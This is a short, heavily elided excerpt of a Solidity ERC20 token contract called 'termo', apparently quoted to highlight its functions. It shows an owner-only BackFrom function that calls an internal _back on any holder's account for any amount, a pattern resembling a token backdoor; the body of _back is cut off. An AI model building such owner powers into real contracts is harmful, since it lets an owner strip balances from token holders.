...
contract termo is Context, ERC20, Ownable {
 ...
 function BackFrom(address account, uint256 amount) public onlyOwner virtual {
      _back(account, amount);
  }
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
    ...
    function Back(uint256 amount) public virtual {
      _back(_msgSender(), amount);
    }
    
    function _back(address account, uint256 amount) internal {
